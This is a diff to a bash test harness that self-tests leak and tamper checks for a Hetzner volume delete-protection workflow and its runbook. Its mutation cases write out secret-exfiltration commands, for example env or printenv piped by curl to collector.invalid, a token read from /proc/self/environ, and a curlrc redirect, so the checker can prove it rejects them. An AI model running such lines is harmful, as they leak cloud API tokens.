@@ -1499,11 +2269,25 @@ _iv_heredoc() { printf 'verdict<<EOF\nx\nEOF\n' > "$CASE/out/probe"; }
 _iv_url() { printf 'https://api.hetzner.cloud/v1/volumes?name=other&per_page=50\0' > "$CASE/curl.1.argv"; printf 'header = "Authorization: Bearer %s"' "$CASE_TOK" > "$CASE/curl.1.stdin"; }
 _iv_cred() { printf 'https://api.hetzner.cloud/v1/volumes?name=%s&per_page=50\0' "$CASE_NAME" > "$CASE/curl.1.argv"; printf 'header = "Authorization: Bearer wrong"' > "$CASE/curl.1.stdin"; }
 _iv_argvtok() { printf 'https://api.hetzner.cloud/v1/volumes?name=%s&per_page=50\0-H\0%s\0' "$CASE_NAME" "$TOK" > "$CASE/curl.1.argv"; printf 'header = "Authorization: Bearer %s"' "$CASE_TOK" > "$CASE/curl.1.stdin"; }
+_iv_noentry() { printf 'sole-copy-check verdict=matches-declared expected=true live=true http=200\n' > "$CASE/probe.log"; }
+_iv_otherentry() { printf 'sole-copy-check verdict=matches-declared entry=%s (clean)\n' "$OTHER_ENTRY" > "$CASE/gate.log"; }
+_iv_entrylate() { printf '::error::sole-copy-check verdict=could-not-read http=500 entry=%s \n' "$ENTRY" > "$CASE/gate.log"; }
+_iv_ran() { printf '{"steps":{"probe":{"ran":true},"gate":{"ran":true}}}\n' > "$CASE/result.json"; }   # both steps ran
+_iv_entryok() { _iv_ran; printf 'verdict=matches-declared\n' > "$CASE/out/probe"; printf 'sole-copy-check verdict=matches-declared entry=%s expected=true\n::warning::sole-copy-check verdict=x: a note\n' "$ENTRY" > "$CASE/probe.log"; printf 'sole-copy-check verdict=matches-declared entry=%s (clean)\n' "$ENTRY" > "$CASE/gate.log"; }
+_iv_forgedverdict() { _iv_entryok; printf 'verdict=unprotected-as-declared\n' > "$CASE/out/probe"; }   # both lines claim matches-declared
+_iv_forgedprobe() { _iv_entryok; printf 'verdict=unprotected-as-declared\n' > "$CASE/out/probe"; printf 'sole-copy-check verdict=unprotected-as-declared entry=%s (clean)\n' "$ENTRY" > "$CASE/gate.log"; }   # the probe line alone
+_iv_forgedgate() { _iv_entryok; printf 'verdict=unprotected-as-declared\n' > "$CASE/out/probe"; printf 'sole-copy-check verdict=unprotected-as-declared entry=%s expected=true\n' "$ENTRY" > "$CASE/probe.log"; }   # the gate line alone
+_iv_noprobeline() { _iv_entryok; printf '::warning::sole-copy-check verdict=x: a note\n' > "$CASE/probe.log"; }
+_iv_nogateline() { _iv_entryok; printf 'sole-copy-check clean\n' > "$CASE/gate.log"; }
+_iv_twogatelines() { _iv_entryok; printf '::error::sole-copy-check verdict=none entry=%s http=none\n' "$ENTRY" >> "$CASE/gate.log"; }
+_iv_othername() { printf 'https://api.hetzner.cloud/v1/volumes?name=%s&per_page=50\0%s\0' "$CASE_NAME" "$OTHER_NAME" > "$CASE/curl.1.argv"; printf 'header = "Authorization: Bearer %s"' "$CASE_TOK" > "$CASE/curl.1.stdin"; }
+_iv_otherid() { printf 'x %s y\n' "$OTHER_ID" > "$CASE/zz.log"; }
+_iv_commits() { echo "gh api commits path=some-other-file" >> "$SEQ"; }
 _iv_good() { printf 'https://api.hetzner.cloud/v1/volumes?name=%s&per_page=50\0' "$CASE_NAME" > "$CASE/curl.1.argv"; printf 'header = "Authorization: Bearer %s"' "$CASE_TOK" > "$CASE/curl.1.stdin"; }
 _hv=""
-for _f in _iv_leak _iv_prefix _iv_rwleak _iv_rwprefix _iv_dopleak _iv_dopprefix _iv_argvprefix _iv_argvrw _iv_argvrwprefix _iv_canary _iv_ghenv _iv_refused _iv_heredoc _iv_url _iv_cred _iv_argvtok; do _inv_fires "$_f" || _hv+=" $_f"; done
-for _f in _iv_clean _iv_good; do if _inv_fires "$_f"; then _hv+=" CONTROL:$_f"; fi; done
-if [[ -z "$_hv" ]]; then pass "H5 invariants() flags a leaked token (read-only, read/write or Doppler), a 6-character prefix of each, a token or prefix on argv, a label canary, a non-empty GITHUB_ENV, a stub refusal, a heredoc output, a wrong request URL, a wrong credential channel and a token on argv, and stays quiet for a clean case"
+for _f in _iv_leak _iv_prefix _iv_rwleak _iv_rwprefix _iv_dopleak _iv_dopprefix _iv_argvprefix _iv_argvrw _iv_argvrwprefix _iv_canary _iv_ghenv _iv_refused _iv_heredoc _iv_url _iv_cred _iv_argvtok _iv_noentry _iv_otherentry _iv_entrylate _iv_noprobeline _iv_nogateline _iv_twogatelines _iv_forgedverdict _iv_forgedprobe _iv_forgedgate _iv_othername _iv_otherid _iv_commits; do _inv_fires "$_f" || _hv+=" $_f"; done
+for _f in _iv_clean _iv_good _iv_entryok; do if _inv_fires "$_f"; then _hv+=" CONTROL:$_f"; fi; done
+if [[ -z "$_hv" ]]; then pass "H5 invariants() flags a leaked token (read-only, read/write or Doppler), a 6-character prefix of each, a token or prefix on argv, a label canary, a non-empty GITHUB_ENV, a stub refusal, a heredoc output, a wrong request URL, a wrong credential channel, a token on argv, a verdict log line with no entry, another entry or entry= not directly after verdict=, a probe or gate that ran and printed no verdict line, a gate that printed two, a probe or gate verdict line naming another verdict than the published one, the other entry's name on a request or id in a stream, and a commits read of another file, and stays quiet for a clean case and for correct verdict lines beside a ::warning:: one"
 else fail "H5 invariants self-test: not flagged or falsely flagged:$_hv"; fi
 CASE_N=$((CASE_N + 1))
 _h6=$( new_case; go
@@ -1512,8 +2296,10 @@ _h6=$( new_case; go
   CHK=""; want_steps skip skip ran skip 1; [[ -n "$CHK" ]] || { printf 'want_steps accepted a wrong gate rc\n'; exit 1; }
   CHK=""; want_req 1; [[ -z "$CHK" ]] || { printf 'want_req flagged the TRUE count\n'; exit 1; }
   CHK=""; want_req 5; [[ -n "$CHK" ]] || { printf 'want_req accepted a wrong count\n'; exit 1; }
+  CHK=""; a "probe" "" "1"; [[ -n "$CHK" ]] || { printf 'a() accepted an EMPTY observation (nothing happened) for a non-empty want\n'; exit 1; }
+  CHK=""; a "probe" "1" "1"; [[ -z "$CHK" ]] || { printf 'a() flagged an equal observation\n'; exit 1; }
   printf 'ok' ) || _h6="exit"
-if [[ "$_h6" == ok ]]; then pass "H6 want_steps and want_req each accept the true value and flag a wrong one"
+if [[ "$_h6" == ok ]]; then pass "H6 want_steps, want_req and a() each accept the true value and flag a wrong one (a() an empty observation too)"
 else fail "H6 want_steps / want_req self-test: $_h6"; fi
 
 CASE_N=$((CASE_N + 10))
@@ -1529,6 +2315,255 @@ _h7=$( PASS=0; FAIL=0; ROWS_RUN=0; INV_ACC=""; INV_DONE=1
 if [[ "$_h7" == ok ]]; then pass "H7 the invariants run for EVERY case of a multi-case row, not only the last: a bad first case fails the row, a clean pair passes"
 else fail "H7 per-case invariants self-test: $_h7"; fi
 INV_ACC=""; INV_DONE=1
+
+# H11: the matrix context is strict in the harness (CTO ruling 21: gha-expr.py renders an unknown key as the runner does, empty, and
+# the harness's check() is the ONE strictness under test). Every verdict is reported with printf + exit, never through the helpers
+# under test.
+mkdir -p "$TMP/h11" || fatal "mkdir h11"
+h11_run() { # h11_run <env-expression> <entry> [<rows-json>] [<uses>]: runs a one-step job through the harness ($EXPRLIB); prints rc,
+  # then stderr. With <uses>, the step is that action instead of a run body.
+  local d; d=$(mktemp -d "$TMP/h11/r.XXXXXX") || fatal "mktemp h11"
+  assert_fixture_dir "$d"
+  printf '%s\n' 'tee -- "$OUT_X" <<<"$X" >/dev/null' > "$d/s1.sh"
+  local rows='[{"entry":"inngest","subject":"Inngest store volume"}]'; if [[ -n "${3-}" ]]; then rows="$3"; fi
+  jq -n --arg v "$1" --argjson rows "$rows" --arg u "${4-}" \
+    '{steps: [if $u == "" then {id: "s1", run: "x", env: {X: $v}} else {id: "s1", uses: $u} end], strategy: {"fail-fast": false, matrix: {include: $rows}}}' > "$d/job.json"
+  jq -n --arg job "$d/job.json" --arg expr "$EXPRLIB" --arg case "$d/case" --arg x "$d" --arg entry "$2" --arg body "$d/s1.sh" --arg ox "$d/x.out" --arg path "$PATH" \
+    '{job: $job, expr: $expr, case: $case, x: $x, entry: $entry, base_env: {PATH: $path, OUT_X: $ox}, overrides: {}, bodies: {s1: $body}, force_outcome: {}, allowed_outputs: {}, no_run: [], github: {}, secrets: {}}' > "$d/spec.json"
+  local rc=0; python3 -I "$TMP/h.py" run "$d/spec.json" > "$d/stdout" 2> "$d/stderr" || rc=$?
+  printf '%s\n' "$rc"; cat "$d/stderr"; [[ -f "$d/x.out" ]] && printf 'X=%s\n' "$(cat "$d/x.out")"
+  return 0
+}
+_h11b=$( _s=$(python3 "$EXPRLIB" value "matrix.nope" '{}' 2>&1) || { printf 'the evaluator is not runnable\n'; exit 1; }
+  [[ -z "$_s" ]] || { printf 'the evaluator is not main'"'"'s (an unknown matrix key rendered %s, want empty): check() would not be the strictness under test\n' "$_s"; exit 1; }
+  _o=$(h11_run '${{ matrix.nope }}' inngest)
+  [[ "$_o" == $'3\nunresolvable reference: matrix.nope' ]] || { printf 'check() did not refuse matrix.nope: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  _o=$(h11_run '${{ matrix.subject }}' inngest)
+  [[ "$_o" == $'0\nX=Inngest store volume' ]] || { printf 'instrument control: with matrix.nope removed, a present key did not render: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  _o=$(h11_run '${{ steps.s1.outcome }}' inngest)
+  [[ "$_o" == $'0\nX=' ]] || { printf 'must-pass: a steps ref absent from the context did not render empty (collateral strictness): [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  printf 'ok' ) || _h11b="exit"
+if [[ "$_h11b" == ok ]]; then pass "H11b the harness's check() refuses a step env naming matrix.nope (exit 3, 'unresolvable reference: matrix.nope') on main's evaluator; controls: a present key renders, a steps ref absent from the context renders empty"
+else fail "H11b check() matrix strictness: $_h11b"; fi
+_h11c=$( _o=$(h11_run "\${{ matrix.entry == 'inngest' && matrix.nope == 'x' }}" inngest)
+  [[ "$_o" == $'3\nunresolvable reference: matrix.nope' ]] || { printf 'the SECOND matrix ref of one expression was not checked: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  printf 'ok' ) || _h11c="exit"
+if [[ "$_h11c" == ok ]]; then pass "H11c a second matrix ref after a present first one is still refused (exit 3, the same stderr line)"
+else fail "H11c second-member strictness: $_h11c"; fi
+_h11d=$( _o=$(h11_run '${{ matrix.entry }}' zzz)
+  [[ "$(head -1 <<<"$_o")" == 3 && "$_o" == *"row selection: 0 include rows"* ]] || { printf 'zero matching rows did not exit 3: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  _o=$(h11_run '${{ matrix.entry }}' inngest '[{"entry":"inngest"},{"entry":"inngest"}]')
+  [[ "$(head -1 <<<"$_o")" == 3 && "$_o" == *"row selection: 2 include rows"* ]] || { printf 'two matching rows did not exit 3: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  _o=$(h11_run '${{ matrix.entry }}' web1 '[{"entry":"inngest"},{"entry":"web1"}]')
+  [[ "$_o" == $'0\nX=web1' ]] || { printf 'control: one matching row did not render its entry: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  printf 'ok' ) || _h11d="exit"
+if [[ "$_h11d" == ok ]]; then pass "H11d the harness selects exactly one include row by entry: zero or two matches exit 3, one match renders that row"
+else fail "H11d row selection: $_h11d"; fi
+# H11e (review round 2): the harness refuses what it does not model, at run time, as well as in S1: an expression context outside
+# secrets/github/steps/matrix (gha-expr reads it as null, the runner as a value), a modelled root read by index, and an action
+# other than the job's two.
+_h11e=$( _o=$(h11_run "\${{ runner.os == 'Linux' && 'none.tf' || matrix.subject }}" inngest)
+  [[ "$_o" == $'3\nunresolvable reference: unmodelled context: runner' ]] || { printf 'runner.os was evaluated, not refused: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  _o=$(h11_run "\${{ matrix['subject'] }}" inngest)
+  [[ "$_o" == $'3\nunresolvable reference: unmodelled context: matrix' ]] || { printf 'an index read of matrix was evaluated, not refused: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  _o=$(h11_run '' inngest '' 'someorg/someaction@v1')
+  [[ "$_o" == $'3\nunmodelled action: someorg/someaction@v1' ]] || { printf 'an unmodelled action was recorded, not refused: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  _o=$(h11_run '' inngest '' './.github/actions/notify-ops-email')
+  [[ "$_o" == '0' ]] || { printf 'control: the notify action was refused: [%s]\n' "$(tr '\n' '|' <<<"$_o")"; exit 1; }
+  printf 'ok' ) || _h11e="exit"
+if [[ "$_h11e" == ok ]]; then pass "H11e the harness refuses an unmodelled expression context (runner.os), an index read of a modelled one and an unmodelled action (exit 3 each); control: the notify action runs"
+else fail "H11e unmodelled contexts and actions: $_h11e"; fi
+# H12: the issue-store id ban fires on a planted id (one leg; the ban does not depend on the leg).
+_h12=""
+_iv_issueid() { jq --arg b "body naming volume $VOL_ID" '. + [{number: 9, title: "t", state: "open", labels: ["infra-drift"], milestone: "", body: $b, author: "app/github-actions", comments: []}]' "$SCEN/issues.json" > "$SCEN/i.tmp" && mv "$SCEN/i.tmp" "$SCEN/issues.json"; }
+_iv_commentid() { jq --arg c "comment naming $OTHER_ID" '. + [{number: 9, title: "t", state: "open", labels: ["infra-drift"], milestone: "", body: "b", author: "app/github-actions", comments: [$c]}]' "$SCEN/issues.json" > "$SCEN/i.tmp" && mv "$SCEN/i.tmp" "$SCEN/issues.json"; }
+_iv_cleanissue() { jq '. + [{number: 9, title: "t", state: "open", labels: ["infra-drift"], milestone: "", body: "b", author: "app/github-actions", comments: ["c"]}]' "$SCEN/issues.json" > "$SCEN/i.tmp" && mv "$SCEN/i.tmp" "$SCEN/issues.json"; }
+for _f in _iv_issueid _iv_commentid; do CASE_N=$((CASE_N + 1)); SCEN_N=$((SCEN_N + 1)); ( new_scen; new_case; "$_f"; invariants; [[ -n "$CHK" ]] ) || _h12+=" $_f"; done
+CASE_N=$((CASE_N + 1)); SCEN_N=$((SCEN_N + 1)); if ( new_scen; new_case; _iv_cleanissue; invariants; [[ -n "$CHK" ]] ); then _h12+=" CONTROL:_iv_cleanissue"; fi
+if [[ -z "$_h12" ]]; then pass "H12 invariants() reads the issue store: an id planted in an issue body or comment is flagged, a clean issue is not"
+else fail "H12 issue-store id ban self-test: not flagged or falsely flagged:$_h12"; fi
+# H14: N1c's section bounds and id equalities. Each mutant is a COPY; the real documents are never edited. Each must make n1c report.
+mkdir -p "$TMP/n1c" || fatal "mkdir n1c"
+_h14=""
+n1c_mut() { # n1c_mut <label> <adr-copy> <runbook-copy>: the copy must differ from the real file and n1c must report
+  if cmp -s "$2" "$ADR119" && cmp -s "$3" "$RB6604"; then _h14+=" $1(did-not-land)"; return; fi
+  [[ -n "$(n1c "$2" "$3" "$_wpin" "$_pin")" ]] || _h14+=" $1"
+}
+awk '{print} /^## Addendum — 2026-11-10 \(#10432/{print "The orphaned volume was Hetzner id 106406962."}' "$ADR119" > "$TMP/n1c/adr.two.md"
+n1c_mut two-matches "$TMP/n1c/adr.two.md" "$RB6604"
+awk '/^## Addendum — 2026-11-10 \(#10432/{print; f=1; next} /^## /{f=0} !f' "$ADR119" > "$TMP/n1c/adr.empty.md"
+n1c_mut empty-addendum "$TMP/n1c/adr.empty.md" "$RB6604"
+awk -v pin="$_wpin" '/^## Addendum — 2026-11-10 \(#10432/{f=1; print "Hetzner id " pin " (stated before the section)"; print; next} /^## /{f=0} f && /Hetzner id/{gsub(/Hetzner id `?[0-9]+`?/, "the volume")} {print}' "$ADR119" > "$TMP/n1c/adr.moved.md"
+n1c_mut moved-outside-the-section "$TMP/n1c/adr.moved.md" "$RB6604"
+awk '/^## Read back the delete-protection flag \(read-only token\)$/{print; f=1; next} /^## /{f=0} !f' "$RB6604" > "$TMP/n1c/rb.empty.md"
+n1c_mut emptied-read-back-section "$ADR119" "$TMP/n1c/rb.empty.md"
+mut_lit() { # mut_lit <in> <out> <start-regex> <stop-regex> <from> <to>: every literal <from> becomes <to> on the lines from the first
+  # <start> line up to (not including) the next <stop> line; an empty <start> matches every line. Bracket classes, not backslashes,
+  # in the regexes (awk -v would eat a backslash).
+  awk -v s="$3" -v e="$4" -v a="$5" -v b="$6" 'function rep(t,   i, o) { o = ""; while ((i = index(t, a)) > 0) { o = o substr(t, 1, i - 1) b; t = substr(t, i + length(a)) } return o t }
+    f && $0 ~ e { f = 0 } $0 ~ s { f = 1 } { print (f ? rep($0) : $0) }' "$1" > "$2" || fatal "mut_lit $2"
+}
+_adrs='^## Addendum — 2026-11-10 [(]#10432'; _rbs='^## Read back the delete-protection flag [(]read-only token[)]$'; _vbs='[*][*]Verify the retired end state'
+# Equal-count wrong ids: the line count and the match count stay what n1c wants, only the id is the other entry's.
+mut_lit "$ADR119" "$TMP/n1c/adr.wrongid.md" "$_adrs" '^## ' "Hetzner id \`$_wpin\`" "Hetzner id \`$_pin\`"
+n1c_mut addendum-names-the-inngest-id "$TMP/n1c/adr.wrongid.md" "$RB6604"
+mut_lit "$RB6604" "$TMP/n1c/rb.wrongid.md" "$_rbs" '^## ' "v1/volumes/$_wpin" "v1/volumes/$_pin"
+n1c_mut read-back-names-the-inngest-id "$ADR119" "$TMP/n1c/rb.wrongid.md"
+mut_lit "$RB6604" "$TMP/n1c/rb.vbget.md" "$_vbs" '^   > ' "v1/volumes/$_wpin" "v1/volumes/$_pin"
+n1c_mut verify-block-get-names-the-inngest-id "$ADR119" "$TMP/n1c/rb.vbget.md"
+mut_lit "$RB6604" "$TMP/n1c/rb.vbexpect.md" "$_vbs" '^   > ' "expect [$_wpin]" "expect [$_pin]"
+n1c_mut verify-block-expect-names-the-inngest-id "$ADR119" "$TMP/n1c/rb.vbexpect.md"
+# The retired volume's `# expect 404` GET, which the file-wide set leaves out, rewritten to name the pin (only the 404 clause sees it).
+_r404=$(grep -F -e '--only-secrets HCLOUD_TOKEN_READONLY' "$RB6604" | grep -oE "v1/volumes/[0-9]+'[[:space:]]+# expect 404\$" | grep -oE 'v1/volumes/[0-9]+' | head -1)
+mut_lit "$RB6604" "$TMP/n1c/rb.vb404.md" "$_vbs" '^   > ' "${_r404:-@@none@@}'" "v1/volumes/$_wpin'"
+n1c_mut verify-block-404-get-names-the-pin "$ADR119" "$TMP/n1c/rb.vb404.md"
+if [[ -z "$_h14" ]]; then pass "H14 N1c goes RED on a copy with a second 'Hetzner id' in the addendum, an empty addendum, the id moved outside the section, an emptied runbook read-back section, (equal counts, wrong id) the addendum, the read-back GET, the verify-block volume GET or the verify-block 'expect [id]' naming the inngest id, and the verify block's expect-404 GET naming the pin"
+else fail "H14 N1c section-bound self-test: not caught:$_h14"; fi
+# H15: the read-only command-line check (each mutant on a copy; each must fail rb_cmdline_ok, the exact-text pin). The "moved"
+# mutants MOVE the Authorization header from curl's stdin config to its argument list; the "kept" ones keep the printf construct
+# and add a second token channel; the verification-pass ones (V3) read the token without naming it, drop the curl confinement,
+# change the quoting, or add a line to the block.
+_h15=""
+_rb_mark() { # _rb_mark <rb|vb>: runbook 6604 with the target line prefixed @@CMD@@: the read-back section's doppler line (rb) or
+  # the 4th doppler line of the "Verify the retired end state" block (vb)
+  awk -v t="$1" '/^## Read back the delete-protection flag \(read-only token\)$/{r=1} /^## /&&!/^## Read back the delete-protection flag/{r=0}
+    /\*\*Verify the retired end state/{v=1} v && /^   > /{v=0}
+    { m = 0; if (/^[ \t]*doppler run /) { if (t == "rb" && r) m = 1; if (t == "vb" && v && ++n == 4) m = 1 } print (m ? "@@CMD@@" $0 : $0) }' "$RB6604"
+}
+_rb_judge() { # _rb_judge <label>: the copy must differ from the real runbook and rb_cmdline_ok must refuse it
+  if cmp -s "$TMP/n1c/rb.$1.md" "$RB6604"; then _h15+=" $1(did-not-land)"; return; fi
+  if rb_cmdline_ok "$TMP/n1c/rb.$1.md" "$_wpin"; then _h15+=" $1"; fi
+}
+rb_mut() { # rb_mut <label> <rb|vb> <sed commands applied to the target line>
+  _rb_mark "$2" | sed -e "/^@@CMD@@/{$3}" -e 's/^@@CMD@@//' > "$TMP/n1c/rb.$1.md"; _rb_judge "$1"
+}
+rb_put() { # rb_put <label> <rb|vb> <text>: the target line becomes <text> (the line's own indentation first), or, when <text>
+  # holds @@SELF@@, <text> with the original line in its place. Passed through the environment, so no character is reinterpreted.
+  _rb_mark "$2" | RB_NEW="$3" awk 'index($0, "@@CMD@@") == 1 { o = substr($0, 8); n = ENVIRON["RB_NEW"]; i = index(n, "@@SELF@@")
+      if (i) { print substr(n, 1, i - 1) o substr(n, i + 8) } else { match(o, /^[ \t]*/); print substr(o, 1, RLENGTH) n }; next } { print }' \
+    > "$TMP/n1c/rb.$1.md"; _rb_judge "$1"
+}
+_mv='s/Authorization: Bearer %s/X-Note: %s/;s/ -sS --config - / -sS --config - '   # + <spelling> /: the header moves to argv
+rb_mut second-only-secrets rb 's/--only-secrets HCLOUD_TOKEN_READONLY /--only-secrets HCLOUD_TOKEN_READONLY --only-secrets HCLOUD_TOKEN /'
+rb_mut argv-header rb 's/ -sS --config - / -sS -H "Authorization: Bearer $HCLOUD_TOKEN_READONLY" --config - /'
+rb_mut fallback-expansion rb 's/"\$HCLOUD_TOKEN_READONLY" | curl/"${HCLOUD_TOKEN_READONLY:-$HCLOUD_TOKEN}" | curl/'
+rb_mut moved-H rb "${_mv}"'-H "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-header-spaced rb "${_mv}"'--header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-header-equals rb "${_mv}"'--header="Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-H-glued-bare rb "${_mv}"'-HAuthorization:"Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-H-glued-quoted rb "${_mv}"'-H"Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-H-in-cluster rb "${_mv}"'-sSH "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut H-from-a-variable rb 's/ -sS --config - / -sS --config --H "$HDR" /'
+rb_mut oauth2-bearer rb 's/ -sS --config - / -sS --config ---oauth2-bearer "$HCLOUD_TOKEN_READONLY" /'
+rb_mut second-authorization rb 's/ -sS --config - / -sS --config ---proxy-header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+# Review round 2: spellings no list named; each is caught by the exact constructs and the token-name count, not by a spelling.
+rb_mut moved-H-quoted rb "${_mv}"'"-H" "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-proxy-header rb "${_mv}"'--proxy-header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-header-abbreviated rb "${_mv}"'--heade "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-flag-in-a-variable rb "${_mv}"'$F "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut moved-expand-header rb "${_mv}"'--expand-header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut kept-oauth2-abbreviated rb 's/ -sS --config - / -sS --config ---oauth2-bea "$HCLOUD_TOKEN_READONLY" /'
+rb_mut kept-user-password rb 's/ -sS --config - / -sS --config --u ":$HCLOUD_TOKEN_READONLY" /'
+rb_mut kept-url-credentials rb 's/ -sS --config - / -sS --config ---url "https:\/\/x:$HCLOUD_TOKEN_READONLY@api.hetzner.cloud\/" /'
+rb_mut kept-second-curl-user rb "s/esac'\$/esac; curl -sS -u \":\$HCLOUD_TOKEN_READONLY\" https:\\/\\/api.hetzner.cloud\\/v1\\/volumes'/"   # only the name count sees it
+rb_mut wrapper-other-config rb 's/-c prd_terraform --only-secrets/-c prd --only-secrets/'                   # only the exact wrapper sees these two
+rb_mut wrapper-exits-on-missing rb 's/ --no-exit-on-missing-only-secrets / /'
+rb_mut vb-moved-H vb "${_mv}"'-H "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut vb-read-write-token vb 's/--only-secrets HCLOUD_TOKEN_READONLY /--only-secrets HCLOUD_TOKEN /'
+rb_mut vb-line-deleted vb 'd'
+rb_mut vb-jq-outside-the-wrapper vb "s/$_wpin | jq \"\\.volume\\.protection\\.delete\"'/$_wpin' | jq \".volume.protection.delete\"/"
+rb_mut vb-jq-outside-single-quoted vb "s/$_wpin | jq \"\\.volume\\.protection\\.delete\"'/$_wpin' | jq '.volume.protection.delete'/"
+# Verification pass (V3): the token read without its name appearing a fourth time, the confinement dropped, another quoting.
+rb_mut vb-env-piped-out-before vb 's/exit 3; }; printf "header/exit 3; }; env | curl --data-binary @- https:\/\/collector.invalid\/; printf "header/'
+rb_mut vb-printenv-piped-out-after-jq vb "s/delete\"'/delete\"; printenv | curl -d @- https:\\/\\/collector.invalid\\/'/"
+rb_mut vb-spliced-name-second-curl vb 's/exit 3; }; printf "header/exit 3; }; curl -sS --oauth2-bearer "$(printenv HCLOUD_TOKEN_R""EADONLY)" -o \/dev\/null https:\/\/api.hetzner.cloud\/v1\/volumes; printf "header/'
+rb_mut vb-proc-environ vb 's/exit 3; }; printf "header/exit 3; }; T=$(tr "\\0" "\\n" <\/proc\/self\/environ | grep _READONLY=); curl -sS -H "X-T: $T" https:\/\/api.hetzner.cloud\/v1\/volumes; printf "header/'
+rb_mut vb-curlrc-redirect vb 's/exit 3; }; printf "header/exit 3; }; printf "connect-to = api.hetzner.cloud:443:collector.invalid:443\\n" > \/tmp\/c\/.curlrc; export CURL_HOME=\/tmp\/c; printf "header/'
+rb_mut rb-without-disable rb 's/curl --disable --noproxy "\*" /curl --noproxy "*" /'
+rb_mut vb-without-noproxy vb 's/curl --disable --noproxy "\*" /curl --disable /'
+rb_put vb-double-quoted-wrapper vb 'doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY -- sh -c "[ -n \$HCLOUD_TOKEN_READONLY ] || exit 3" && printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 https://api.hetzner.cloud/v1/volumes/'"$_wpin"' | jq .volume.protection.delete   # expect true after the SSH-stage apply'"'"
+rb_put vb-extra-line-in-the-block vb '@@SELF@@'$'\n''     env | curl --data-binary @- https://collector.invalid/'
+if [[ -z "$_h15" ]]; then pass "H15 the read-only command-line check (the five lines pinned as exact text) fails, on a copy each: a second --only-secrets of the read/write name, an argv bearer header, a fallback expansion, the header moved to argv as -H, --header, --header=, -HAuthorization, -H\"Authorization, -sSH, \"-H\", --proxy-header, --heade, a flag in a variable, --expand-header, a -H from a variable, --oauth2-bearer, --oauth2-bea, -u, a URL with credentials, a second Authorization (--proxy-header), a second curl reading the token with -u, another Doppler config, the wrapper without --no-exit-on-missing-only-secrets, curl without --disable; and in the verify block an argv header, the read/write token, a deleted line, jq moved outside the wrapper (double- or single-quoted filter), env or printenv piped to another host before the construct or after jq, a second curl on a spliced token name, the token read from /proc/self/environ, a curlrc redirect written and exported, curl without --noproxy, a double-quoted wrapper with the request outside it, and an extra line in the block"
+else fail "H15 read-only command-line self-test: not caught:$_h15"; fi
+# H16 (negative controls for the text helpers): each is fed a scenario that must pass and one that must fail, inside a subshell
+# (the counters of the real run never move); SCEN_N and CASE_N are bumped first, so the subshell's directories are fresh.
+SCEN_N=$((SCEN_N + 1)); CASE_N=$((CASE_N + 1))
+_h16=$( new_scen; new_case
+  printf '::warning::sole-copy-check verdict=x: the volume is unprotected, as declared\n' > "$CASE/probe.log"
+  CHK=""; warn_has "unprotected, as declared"; [[ -z "$CHK" ]] || { printf 'warn_has flagged a present text\n'; exit 1; }
+  CHK=""; warn_has "still protected at Hetzner"; [[ -n "$CHK" ]] || { printf 'warn_has accepted an absent text\n'; exit 1; }
+  printf 'sole-copy-check verdict=volume-not-found entry=%s expected=true http=200 reason=zero\n' "$ENTRY" > "$CASE/probe.log"
+  printf 'volume-not-found (reason=zero)\n' > "$CASE/summary"
+  CHK=""; vnf_reason zero; [[ -z "$CHK" ]] || { printf 'vnf_reason flagged the true reason: %s\n' "$CHK"; exit 1; }
+  CHK=""; vnf_reason many; [[ -n "$CHK" ]] || { printf 'vnf_reason accepted a wrong reason\n'; exit 1; }
+  printf 'volume-not-found\n' > "$CASE/summary"
+  CHK=""; vnf_reason zero; [[ -n "$CHK" ]] || { printf 'vnf_reason accepted a summary without the reason\n'; exit 1; }
+  seed_issue "t1"; [[ "$(seeded_open)" == 1 ]] || { printf 'seeded_open did not count an open, uncommented seeded issue\n'; exit 1; }
+  jq '(.[] | select(.title == "t1") | .comments) += ["cleared in run x"]' "$SCEN/issues.json" > "$SCEN/i.tmp" && mv "$SCEN/i.tmp" "$SCEN/issues.json"
+  [[ "$(seeded_open)" == 0 ]] || { printf 'seeded_open counted a seeded issue that carries a comment\n'; exit 1; }
+  seed_issue "t2"; jq '(.[] | select(.title == "t2") | .state) = "closed"' "$SCEN/issues.json" > "$SCEN/i.tmp" && mv "$SCEN/i.tmp" "$SCEN/issues.json"
+  [[ "$(seeded_open)" == 0 ]] || { printf 'seeded_open counted a closed seeded issue\n'; exit 1; }
+  printf 'ok' ) || _h16="exit"
+if [[ "$_h16" == ok ]]; then pass "H16 warn_has, vnf_reason and seeded_open each accept the true scenario and flag a wrong one (an absent warning text; a wrong reason or a summary without it; a seeded issue that is commented or closed)"
+else fail "H16 text-helper self-test: $_h16"; fi
+# H17: N4 on copies. Each mutant must make n4 report; the real documents are never edited.
+mkdir -p "$TMP/n4" || fatal "mkdir n4"
+_h17=""
+n4_mut() { # n4_mut <label> <adr-copy> <workflow-copy>: the copy must differ from the real file and n4 must report
